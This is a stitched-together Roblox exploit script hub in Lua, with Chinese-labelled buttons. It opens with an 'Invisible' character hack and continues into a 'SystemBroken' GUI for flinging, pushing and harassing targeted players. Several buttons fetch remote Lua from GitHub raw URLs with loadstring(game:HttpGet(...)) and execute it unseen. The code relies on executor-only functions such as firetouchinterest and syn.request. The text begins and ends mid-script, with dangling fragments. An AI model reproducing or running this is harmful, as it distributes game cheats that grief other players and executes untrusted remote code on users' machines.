local invisible = game.Players.LocalPlayer
local grips = {}
local heldTool
local gripChanged
local handle
local weld
function setDisplayDistance(distance)
    for _, player in pairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChildWhichIsA("Humanoid") then
            player.Character:FindFirstChildWhichIsA("Humanoid").NameDisplayDistance = distance
            player.Character:FindFirstChildWhichIsA("Humanoid").HealthDisplayDistance = distance
        end
    end
end
local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
tool.Name = "Invisible"
tool.RequiresHandle = false
tool.CanBeDropped = false
tool.Equipped:Connect(
    function()
        wait()
        if not invisible then
            invisible = true
            tool.Name = "Enabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            handle = Instance.new("Part", workspace)
            handle.Name = "Handle"
            handle.Transparency = 1
            handle.CanCollide = false
            handle.Size = Vector3.new(2, 1, 1)
            weld = Instance.new("Weld", handle)
            weld.Part0 = handle
            weld.Part1 = game.Players.LocalPlayer.Character.HumanoidRootPart
            weld.C0 = CFrame.new(0, offset - 1.5, 0)
            setDisplayDistance(offset + 100)
            workspace.CurrentCamera.CameraSubject = handle
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = offset
            game.Players.LocalPlayer.Character.Humanoid:ChangeState(11)
            for _, child in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if child:IsA("Tool") and child ~= tool then
                    grips[child] = child.Grip
                end
            end
        elseif invisible then
            invisible = false
            tool.Name = "Disabled Invisible"
            if handle then
                handle:Destroy()
            end
            if weld then
                weld:Destroy()
            end
            for _, child in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
                if child:IsA("Tool") then
                    child.Parent = game.Players.LocalPlayer.Backpack
                end
            end
            for tool, grip in pairs(grips) do
                if tool then
                    tool.Grip = grip
                end
            end
            heldTool = nil
            setDisplayDistance(100)
            workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, -offset, 0)
            game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
        end
        tool.Parent = game.Players.LocalPlayer.Backpack
    end
)
game.Players.LocalPlayer.Character.ChildAdded:Connect(
    function(child)
        wait()
        if invisible and child:IsA("Tool") and child ~= heldTool and child ~= tool then
            heldTool = child
            local lastGrip = heldTool.Grip
            if not grips[heldTool] then
                grips[heldTool] = lastGrip
            end
            for _, track in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                track:Stop()
            end
            game.Players.LocalPlayer.Character.Animate.Disabled = true
            heldTool.Grip = heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
            heldTool.Parent = game.Players.LocalPlayer.Backpack
            heldTool.Parent = game.Players.LocalPlayer.Character
            if gripChanged then
                gripChanged:Disconnect()
            end
            gripChanged =
                heldTool:GetPropertyChangedSignal("Grip"):Connect(
                function()
                    wait()
                    if not invisible then
                        gripChanged:Disconnect()
                    end
                    if heldTool.Grip ~= lastGrip then
                        lastGrip =
                            heldTool.Grip * (CFrame.new(0, offset - 1.5, 1.5) * CFrame.Angles(math.rad(-90), 0, 0))
                        heldTool.Grip = lastGrip
                        heldTool.Parent = game.Players.LocalPlayer.Backpack
                        heldTool.Parent = game.Players.LocalPlayer.Character
                    end
                end
            )
        end
    end
)

  	end    

})

Tab:AddButton({

	Name = "doors剪刀",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/shears_done.lua"))()

  	end    

})

Tab:AddButton({

	Name = "黑洞道具（娱乐）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/iimateiYT/Scripts/main/Black%20Hole.lua"))()

  	end    

})

Tab:AddButton({

	Name = "臭猫道具",

	Callback = function()

     local shadow=game:GetObjects("rbxassetid://8069174048")[1]
shadow.Parent = game.Players.LocalPlayer.Backpack
local Players = game:GetService("Players")
local Plr = Players.LocalPlayer
local Char = Plr.Character or Plr.CharacterAdded:Wait()
local Hum = Char:WaitForChild("Humanoid")
local RightArm = Char:WaitForChild("RightUpperArm")
local LeftArm = Char:WaitForChild("LeftUpperArm")
local RightC1 = RightArm.RightShoulder.C1
local LeftC1 = LeftArm.LeftShoulder.C1
        local function setupCrucifix(tool)
        RightArm.Name = "R_Arm"
        LeftArm.Name = "L_Arm"
        
        RightArm.RightShoulder.C1 = RightC1 * CFrame.Angles(math.rad(-90), math.rad(-15), 0)
        LeftArm.LeftShoulder.C1 = LeftC1 * CFrame.new(-0.2, -0.3, -0.5) * CFrame.Angles(math.rad(-125), math.rad(25), math.rad(25))
        for v in next, Hum:GetPlayingAnimationTracks() do
            v:Stop()
        end
        end
shadow.Equipped:Connect(function()
setupCrucifix(shadow)
game.Players.LocalPlayer:SetAttribute("Hidden", true)
end)
 
shadow.Unequipped:Connect(function()
    game.Players.LocalPlayer:SetAttribute("Hidden", false)
        RightArm.Name = "RightUpperArm"
        LeftArm.Name = "LeftUpperArm"
        
        RightArm.RightShoulder.C1 = RightC1
        LeftArm.LeftShoulder.C1 = LeftC1
end)

  	end    

})

Tab:AddButton({

	Name = "火箭筒（RPG）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/persopoiu/scripts/main/rushbazooka.lua"))()

  	end    

})

Tab:AddButton({

	Name = "蜡烛（可能不会亮）",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Items/Candle.lua"))()

  	end    

})

Tab:AddButton({

	Name = "普通玩偶",

	Callback = function()

     local tool = game:GetObjects("rbxassetid://13069619857")[1]
tool.Parent = game.Players.LocalPlayer.Backpack

  	end    

})

local Tab = Window:MakeTab({

    Name = "脚本功能",

    Icon = "rbxassetid://4483345998",

    PremiumOnly = false

})

Tab:AddButton({

	Name = "doors汉化",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/XSKMS/MS-Chinese-XXZ/refs/heads/main/rename.txt"))()

  	end    

})

Tab:AddButton({

	Name = "皇冠脚本（主要功能区四）",

	Callback = function()

     --RELOAD GUI
if game.CoreGui:FindFirstChild("SysBroker") then
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = "System Broken",Text = "GUI Already loaded, rejoin to re-execute",Duration = 5;})
	return
end
local version = 2
--VARIABLES
_G.AntiFlingToggled = false
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local Light = game:GetService("Lighting")
local HttpService = game:GetService("HttpService")
local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local mouse = plr:GetMouse()
local ScriptWhitelist = {}
local ForceWhitelist = {}
local TargetedPlayer = nil
local FlySpeed = 50
local PotionTool = nil
local SavedCheckpoint = nil
local MinesFolder = nil
local FreeEmotesEnabled = false
local CannonsFolders = {}

pcall(function()
	MinesFolder = game:GetService("Workspace").Landmines
	for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
		if v.Name == "Cannons" then
			table.insert(CannonsFolders, v)
		end
	end
end)
--FUNCTIONS
_G.shield = function(id)
	if not table.find(ForceWhitelist,id) then
		table.insert(ForceWhitelist, id)
	end
end

local function RandomChar()
	local length = math.random(1,5)
	local array = {}
	for i = 1, length do
		array[i] = string.char(math.random(32, 126))
	end
	return table.concat(array)
end

local function ChangeToggleColor(Button)
	led = Button.Ticket_Asset
	if led.ImageColor3 == Color3.fromRGB(255, 0, 0) then
		led.ImageColor3 = Color3.fromRGB(0, 255, 0)
	else
		led.ImageColor3 = Color3.fromRGB(255, 0, 0)
	end
end

local function GetPing()
	return (game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())/1000
end

local function GetPlayer(UserDisplay)
	if UserDisplay ~= "" then
        for i,v in pairs(Players:GetPlayers()) do
            if v.Name:lower():match(UserDisplay) or v.DisplayName:lower():match(UserDisplay) then
                return v
            end
        end
		return nil
	else
		return nil
    end
end

local function GetCharacter(Player)
	if Player.Character then
		return Player.Character
	end
end

local function GetRoot(Player)
	if GetCharacter(Player):FindFirstChild("HumanoidRootPart") then
		return GetCharacter(Player).HumanoidRootPart
	end
end

local function TeleportTO(posX,posY,posZ,player,method)
	pcall(function()
		if method == "safe" then
			task.spawn(function()
				for i = 1,30 do
					task.wait()
					GetRoot(plr).Velocity = Vector3.new(0,0,0)
					if player == "pos" then
						GetRoot(plr).CFrame = CFrame.new(posX,posY,posZ)
					else
						GetRoot(plr).CFrame = CFrame.new(GetRoot(player).Position)+Vector3.new(0,2,0)
					end
				end
			end)
		else
			GetRoot(plr).Velocity = Vector3.new(0,0,0)
			if player == "pos" then
				GetRoot(plr).CFrame = CFrame.new(posX,posY,posZ)
			else
				GetRoot(plr).CFrame = CFrame.new(GetRoot(player).Position)+Vector3.new(0,2,0)
			end
		end
	end)
end

local function PredictionTP(player,method)
	local root = GetRoot(player)
	local pos = root.Position
	local vel = root.Velocity
	GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	if method == "safe" then
		task.wait()
		GetRoot(plr).CFrame = CFrame.new(pos)
		task.wait()
		GetRoot(plr).CFrame = CFrame.new((pos.X)+(vel.X)*(GetPing()*3.5),(pos.Y)+(vel.Y)*(GetPing()*2),(pos.Z)+(vel.Z)*(GetPing()*3.5))
	end
end

local function Touch(x,root)
	pcall(function()
		x = x:FindFirstAncestorWhichIsA("Part")
		if x then
			if firetouchinterest then
				task.spawn(function()
					firetouchinterest(x, root, 1)
					task.wait()
					firetouchinterest(x, root, 0)
				end)
			end
		end
	end)
end


local function GetPush()
	local TempPush = nil
	pcall(function()
		if plr.Backpack:FindFirstChild("Push") then
			PushTool = plr.Backpack.Push
			PushTool.Parent = plr.Character
			TempPush = PushTool
		end
		for i,v in pairs(Players:GetPlayers()) do
			if v.Character:FindFirstChild("Push") then
				TempPush = v.Character.Push
			end
		end
	end)
	return TempPush
end

local function CheckPotion()
	if plr.Backpack:FindFirstChild("potion") then
		PotionTool = plr.Backpack:FindFirstChild("potion")
		return true
	elseif plr.Character:FindFirstChild("potion") then
		PotionTool = plr.Character:FindFirstChild("potion")
		return true
	else
		return false
	end
end

local function Push(Target)
	local Push = GetPush()
	local FixTool = nil
	if Push ~= nil then
		local args = {[1] = Target.Character}
		GetPush().PushTool:FireServer(unpack(args))
	end
	if plr.Character:FindFirstChild("Push") then
		plr.Character.Push.Parent = plr.Backpack
	end
	if plr.Character:FindFirstChild("ModdedPush") then
		FixTool = plr.Character:FindFirstChild("ModdedPush")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("ClickTarget") then
		FixTool = plr.Character:FindFirstChild("ClickTarget")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
	if plr.Character:FindFirstChild("potion") then
		FixTool = plr.Character:FindFirstChild("potion")
		FixTool.Parent = plr.Backpack
		FixTool.Parent = plr.Character
	end
end

local function ToggleRagdoll(bool)
	pcall(function()
		plr.Character["Falling down"].Disabled = bool
		plr.Character["Swimming"].Disabled = bool
		plr.Character["StartRagdoll"].Disabled = bool
		plr.Character["Pushed"].Disabled = bool
		plr.Character["RagdollMe"].Disabled = bool
	end)
end

local function ToggleVoidProtection(bool)
	if bool then
		game.Workspace.FallenPartsDestroyHeight = 0/0
	else
		game.Workspace.FallenPartsDestroyHeight = -500
	end
end

local function PlayAnim(id,time,speed)
	pcall(function()
		plr.Character.Animate.Disabled = false
		local hum = plr.Character.Humanoid
		local animtrack = hum:GetPlayingAnimationTracks()
		for i,track in pairs(animtrack) do
			track:Stop()
		end
		plr.Character.Animate.Disabled = true
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://"..id
		local loadanim = hum:LoadAnimation(Anim)
		loadanim:Play()
		loadanim.TimePosition = time
		loadanim:AdjustSpeed(speed)
		loadanim.Stopped:Connect(function()
			plr.Character.Animate.Disabled = false
			for i, track in pairs (animtrack) do
        		track:Stop()
    		end
		end)
	end)
end

local function StopAnim()
	plr.Character.Animate.Disabled = false
    local animtrack = plr.Character.Humanoid:GetPlayingAnimationTracks()
    for i, track in pairs (animtrack) do
        track:Stop()
    end
end

local function SendNotify(title, message, duration)
	game:GetService("StarterGui"):SetCore("SendNotification", {Title = title,Text = message,Duration = duration;})
end

--LOAD GUI
task.wait(0.1)
local SysBroker = Instance.new("ScreenGui")
local Background = Instance.new("ImageLabel")
local TitleBarLabel = Instance.new("TextLabel")
local SectionList = Instance.new("Frame")
local Home_Section_Button = Instance.new("TextButton")
local Game_Section_Button = Instance.new("TextButton")
local Character_Section_Button = Instance.new("TextButton")
local Target_Section_Button = Instance.new("TextButton")
local Animations_Section_Button = Instance.new("TextButton")
local Misc_Section_Button = Instance.new("TextButton")
local Credits_Section_Button = Instance.new("TextButton")
local Game_Section = Instance.new("ScrollingFrame")
local AntiRagdoll_Button = Instance.new("TextButton")
local PotionFling_Button = Instance.new("TextButton")
local SpamMines_Button = Instance.new("TextButton")
local PushAura_Button = Instance.new("TextButton")
local BreakCannons_Button = Instance.new("TextButton")
local LethalCannons_Button = Instance.new("TextButton")
local ChatAlert_Button = Instance.new("TextButton")
local PotionDi_Button = Instance.new("TextButton")
local VoidProtection_Button = Instance.new("TextButton")
local PushAll_Button = Instance.new("TextButton")
local TouchFling_Button = Instance.new("TextButton")
local CMDBar = Instance.new("TextBox")
local CannonTP1_Button = Instance.new("TextButton")
local CannonTP2_Button = Instance.new("TextButton")
local CannonTP3_Button = Instance.new("TextButton")
local MinefieldTP_Button = Instance.new("TextButton")
local BallonTP_Button = Instance.new("TextButton")
local NormalStairsTP_Button = Instance.new("TextButton")
local MovingStairsTP_Button = Instance.new("TextButton")
local SpiralStairsTP_Button = Instance.new("TextButton")
local SkyscraperTP_Button = Instance.new("TextButton")
local PoolTP_Button = Instance.new("TextButton")
local FreePushTool_Button = Instance.new("TextButton")
local Home_Section = Instance.new("ScrollingFrame")
local Profile_Image = Instance.new("ImageLabel")
local Welcome_Label = Instance.new("TextLabel")
local Announce_Label = Instance.new("TextLabel")
local Character_Section = Instance.new("ScrollingFrame")
local WalkSpeed_Button = Instance.new("TextButton")
local WalkSpeed_Input = Instance.new("TextBox")
local ClearCheckpoint_Button = Instance.new("TextButton")
local JumpPower_Input = Instance.new("TextBox")
local JumpPower_Button = Instance.new("TextButton")
local SaveCheckpoint_Button = Instance.new("TextButton")
local Respawn_Button = Instance.new("TextButton")
local FlySpeed_Button = Instance.new("TextButton")
local FlySpeed_Input = Instance.new("TextBox")
local Fly_Button = Instance.new("TextButton")
local Target_Section = Instance.new("ScrollingFrame")
local TargetImage = Instance.new("ImageLabel")
local ClickTargetTool_Button = Instance.new("ImageButton")
local TargetName_Input = Instance.new("TextBox")
local UserIDTargetLabel = Instance.new("TextLabel")
local ViewTarget_Button = Instance.new("TextButton")
local FlingTarget_Button = Instance.new("TextButton")
local FocusTarget_Button = Instance.new("TextButton")
local BenxTarget_Button = Instance.new("TextButton")
local PushTarget_Button = Instance.new("TextButton")
local WhitelistTarget_Button = Instance.new("TextButton")
local TeleportTarget_Button = Instance.new("TextButton")
local HeadsitTarget_Button = Instance.new("TextButton")
local StandTarget_Button = Instance.new("TextButton")
local BackpackTarget_Button = Instance.new("TextButton")
local DoggyTarget_Button = Instance.new("TextButton")
local DragTarget_Button = Instance.new("TextButton")
local Animations_Section = Instance.new("ScrollingFrame")
local VampireAnim_Button = Instance.new("TextButton")
local HeroAnim_Button = Instance.new("TextButton")
local ZombieClassicAnim_Button = Instance.new("TextButton")
local MageAnim_Button = Instance.new("TextButton")
local GhostAnim_Button = Instance.new("TextButton")
local ElderAnim_Button = Instance.new("TextButton")
local LevitationAnim_Button = Instance.new("TextButton")
local AstronautAnim_Button = Instance.new("TextButton")
local NinjaAnim_Button = Instance.new("TextButton")
local WerewolfAnim_Button = Instance.new("TextButton")
local CartoonAnim_Button = Instance.new("TextButton")
local PirateAnim_Button = Instance.new("TextButton")
local SneakyAnim_Button = Instance.new("TextButton")
local ToyAnim_Button = Instance.new("TextButton")
local KnightAnim_Button = Instance.new("TextButton")
--NEWS
local ConfidentAnim_Button = Instance.new("TextButton")
local PopstarAnim_Button = Instance.new("TextButton")
local PrincessAnim_Button = Instance.new("TextButton")
local CowboyAnim_Button = Instance.new("TextButton")
local PatrolAnim_Button = Instance.new("TextButton")
local ZombieFEAnim_Button = Instance.new("TextButton")
--NEWS
local Misc_Section = Instance.new("ScrollingFrame")
local AntiFling_Button = Instance.new("TextButton")
local AntiChatSpy_Button = Instance.new("TextButton")
local AntiAFK_Button = Instance.new("TextButton")
local Shaders_Button = Instance.new("TextButton")
local Day_Button = Instance.new("TextButton")
local Night_Button = Instance.new("TextButton")
local Rejoin_Button = Instance.new("TextButton")
local CMDX_Button = Instance.new("TextButton")
local InfYield_Button = Instance.new("TextButton")
local Serverhop_Button = Instance.new("TextButton")
local Explode_Button = Instance.new("TextButton")
local FreeEmotes_Button = Instance.new("TextButton")
local ChatBox_Input = Instance.new("TextBox")
local Credits_Section = Instance.new("ScrollingFrame")
local Credits_Label = Instance.new("TextLabel")
local Crown = Instance.new("ImageLabel")
local Assets = Instance.new("Folder")
local Ticket_Asset = Instance.new("ImageButton")
local Click_Asset = Instance.new("ImageButton")
local Velocity_Asset = Instance.new("BodyAngularVelocity")
local Fly_Pad = Instance.new("ImageButton")
local UIGradient = Instance.new("UIGradient")
local FlyAButton = Instance.new("TextButton")
local FlyDButton = Instance.new("TextButton")
local FlyWButton = Instance.new("TextButton")
local FlySButton = Instance.new("TextButton")
local OpenClose = Instance.new("ImageButton")
local UICornerOC = Instance.new("UICorner")

local function CreateToggle(Button)
	local NewToggle = Ticket_Asset:Clone()
	NewToggle.Parent = Button
end

local function CreateClicker(Button)
	local NewClicker = Click_Asset:Clone()
	NewClicker.Parent = Button
end

SysBroker.Name = "SysBroker"
SysBroker.Parent = game.CoreGui
SysBroker.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Background.Name = "Background"
Background.Parent = SysBroker
Background.AnchorPoint = Vector2.new(0.5, 0.5)
Background.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Background.BorderColor3 = Color3.fromRGB(0, 255, 255)
Background.Position = UDim2.new(0.5, 0, 0.5, 0)
Background.Size = UDim2.new(0, 500, 0, 350)
Background.ZIndex = 9
Background.Image = "rbxassetid://159991693"
Background.ImageColor3 = Color3.fromRGB(0, 255, 255)
Background.ImageTransparency = 0.600
Background.ScaleType = Enum.ScaleType.Tile
Background.SliceCenter = Rect.new(0, 256, 0, 256)
Background.TileSize = UDim2.new(0, 30, 0, 30)
Background.Active = true
Background.Draggable = true

TitleBarLabel.Name = "TitleBarLabel"
TitleBarLabel.Parent = Background
TitleBarLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TitleBarLabel.BackgroundTransparency = 0.250
TitleBarLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TitleBarLabel.BorderSizePixel = 0
TitleBarLabel.Size = UDim2.new(1, 0, 0, 30)
TitleBarLabel.Font = Enum.Font.Unknown
TitleBarLabel.Text = "____/SYSTEMBROKEN\\___"
TitleBarLabel.TextColor3 = Color3.fromRGB(0, 255, 255)
TitleBarLabel.TextScaled = true
TitleBarLabel.TextSize = 14.000
TitleBarLabel.TextWrapped = true
TitleBarLabel.TextXAlignment = Enum.TextXAlignment.Left

SectionList.Name = "SectionList"
SectionList.Parent = Background
SectionList.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
SectionList.BackgroundTransparency = 0.500
SectionList.BorderColor3 = Color3.fromRGB(0, 0, 0)
SectionList.BorderSizePixel = 0
SectionList.Position = UDim2.new(0, 0, 0, 30)
SectionList.Size = UDim2.new(0, 105, 0, 320)

Home_Section_Button.Name = "Home_Section_Button"
Home_Section_Button.Parent = SectionList
Home_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Home_Section_Button.BackgroundTransparency = 0.500
Home_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_Section_Button.BorderSizePixel = 0
Home_Section_Button.Position = UDim2.new(0, 0, 0, 25)
Home_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Home_Section_Button.Font = Enum.Font.Oswald
Home_Section_Button.Text = "Home"
Home_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Home_Section_Button.TextScaled = true
Home_Section_Button.TextSize = 14.000
Home_Section_Button.TextWrapped = true

Game_Section_Button.Name = "Game_Section_Button"
Game_Section_Button.Parent = SectionList
Game_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Game_Section_Button.BackgroundTransparency = 0.500
Game_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Game_Section_Button.BorderSizePixel = 0
Game_Section_Button.Position = UDim2.new(0, 0, 0, 65)
Game_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Game_Section_Button.Font = Enum.Font.Oswald
Game_Section_Button.Text = "Game"
Game_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Game_Section_Button.TextScaled = true
Game_Section_Button.TextSize = 14.000
Game_Section_Button.TextWrapped = true

Character_Section_Button.Name = "Character_Section_Button"
Character_Section_Button.Parent = SectionList
Character_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Character_Section_Button.BackgroundTransparency = 0.500
Character_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Character_Section_Button.BorderSizePixel = 0
Character_Section_Button.Position = UDim2.new(0, 0, 0, 105)
Character_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Character_Section_Button.Font = Enum.Font.Oswald
Character_Section_Button.Text = "Character"
Character_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Character_Section_Button.TextScaled = true
Character_Section_Button.TextSize = 14.000
Character_Section_Button.TextWrapped = true

Target_Section_Button.Name = "Target_Section_Button"
Target_Section_Button.Parent = SectionList
Target_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Target_Section_Button.BackgroundTransparency = 0.500
Target_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Target_Section_Button.BorderSizePixel = 0
Target_Section_Button.Position = UDim2.new(0, 0, 0, 145)
Target_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Target_Section_Button.Font = Enum.Font.Oswald
Target_Section_Button.Text = "Target"
Target_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Target_Section_Button.TextScaled = true
Target_Section_Button.TextSize = 14.000
Target_Section_Button.TextWrapped = true

Animations_Section_Button.Name = "Animations_Section_Button"
Animations_Section_Button.Parent = SectionList
Animations_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Animations_Section_Button.BackgroundTransparency = 0.500
Animations_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section_Button.BorderSizePixel = 0
Animations_Section_Button.Position = UDim2.new(0, 0, 0, 185)
Animations_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Animations_Section_Button.Font = Enum.Font.Oswald
Animations_Section_Button.Text = "Animations"
Animations_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section_Button.TextScaled = true
Animations_Section_Button.TextSize = 14.000
Animations_Section_Button.TextWrapped = true

Misc_Section_Button.Name = "Misc_Section_Button"
Misc_Section_Button.Parent = SectionList
Misc_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Misc_Section_Button.BackgroundTransparency = 0.500
Misc_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section_Button.BorderSizePixel = 0
Misc_Section_Button.Position = UDim2.new(0, 0, 0, 225)
Misc_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Misc_Section_Button.Font = Enum.Font.Oswald
Misc_Section_Button.Text = "Misc"
Misc_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section_Button.TextScaled = true
Misc_Section_Button.TextSize = 14.000
Misc_Section_Button.TextWrapped = true

Credits_Section_Button.Name = "Credits_Section_Button"
Credits_Section_Button.Parent = SectionList
Credits_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Credits_Section_Button.BackgroundTransparency = 0.500
Credits_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section_Button.BorderSizePixel = 0
Credits_Section_Button.Position = UDim2.new(0, 0, 0, 265)
Credits_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Credits_Section_Button.Font = Enum.Font.Oswald
Credits_Section_Button.Text = "Credits"
Credits_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section_Button.TextScaled = true
Credits_Section_Button.TextSize = 14.000
Credits_Section_Button.TextWrapped = true

Game_Section.Name = "Game_Section"
Game_Section.Parent = Background
Game_Section.Active = true
Game_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Game_Section.BackgroundTransparency = 1.000
Game_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Game_Section.BorderSizePixel = 0
Game_Section.Position = UDim2.new(0, 105, 0, 30)
Game_Section.Size = UDim2.new(0, 395, 0, 320)
Game_Section.Visible = false
Game_Section.CanvasSize = UDim2.new(0, 0, 1.85, 0)
Game_Section.ScrollBarThickness = 5

AntiRagdoll_Button.Name = "AntiRagdoll_Button"
AntiRagdoll_Button.Parent = Game_Section
AntiRagdoll_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiRagdoll_Button.BackgroundTransparency = 0.500
AntiRagdoll_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiRagdoll_Button.BorderSizePixel = 0
AntiRagdoll_Button.Position = UDim2.new(0, 25, 0, 25)
AntiRagdoll_Button.Size = UDim2.new(0, 150, 0, 30)
AntiRagdoll_Button.Font = Enum.Font.Oswald
AntiRagdoll_Button.Text = "Anti ragdoll"
AntiRagdoll_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiRagdoll_Button.TextScaled = true
AntiRagdoll_Button.TextSize = 14.000
AntiRagdoll_Button.TextWrapped = true

PotionFling_Button.Name = "PotionFling_Button"
PotionFling_Button.Parent = Game_Section
PotionFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PotionFling_Button.BackgroundTransparency = 0.500
PotionFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PotionFling_Button.BorderSizePixel = 0
PotionFling_Button.Position = UDim2.new(0, 210, 0, 75)
PotionFling_Button.Size = UDim2.new(0, 150, 0, 30)
PotionFling_Button.Font = Enum.Font.Oswald
PotionFling_Button.Text = "Potion Fling"
PotionFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PotionFling_Button.TextScaled = true
PotionFling_Button.TextSize = 14.000
PotionFling_Button.TextWrapped = true

SpamMines_Button.Name = "SpamMines_Button"
SpamMines_Button.Parent = Game_Section
SpamMines_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SpamMines_Button.BackgroundTransparency = 0.500
SpamMines_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpamMines_Button.BorderSizePixel = 0
SpamMines_Button.Position = UDim2.new(0, 25, 0, 75)
SpamMines_Button.Size = UDim2.new(0, 150, 0, 30)
SpamMines_Button.Font = Enum.Font.Oswald
SpamMines_Button.Text = "Spam mines"
SpamMines_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SpamMines_Button.TextScaled = true
SpamMines_Button.TextSize = 14.000
SpamMines_Button.TextWrapped = true

PushAura_Button.Name = "PushAura_Button"
PushAura_Button.Parent = Game_Section
PushAura_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushAura_Button.BackgroundTransparency = 0.500
PushAura_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushAura_Button.BorderSizePixel = 0
PushAura_Button.Position = UDim2.new(0, 210, 0, 25)
PushAura_Button.Size = UDim2.new(0, 150, 0, 30)
PushAura_Button.Font = Enum.Font.Oswald
PushAura_Button.Text = "Push aura"
PushAura_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushAura_Button.TextScaled = true
PushAura_Button.TextSize = 14.000
PushAura_Button.TextWrapped = true

BreakCannons_Button.Name = "BreakCannons_Button"
BreakCannons_Button.Parent = Game_Section
BreakCannons_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BreakCannons_Button.BackgroundTransparency = 0.500
BreakCannons_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BreakCannons_Button.BorderSizePixel = 0
BreakCannons_Button.Position = UDim2.new(0, 25, 0, 225)
BreakCannons_Button.Size = UDim2.new(0, 150, 0, 30)
BreakCannons_Button.Font = Enum.Font.Oswald
BreakCannons_Button.Text = "Break Cannons"
BreakCannons_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BreakCannons_Button.TextScaled = true
BreakCannons_Button.TextSize = 14.000
BreakCannons_Button.TextWrapped = true

LethalCannons_Button.Name = "LethalCannons_Button"
LethalCannons_Button.Parent = Game_Section
LethalCannons_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
LethalCannons_Button.BackgroundTransparency = 0.500
LethalCannons_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
LethalCannons_Button.BorderSizePixel = 0
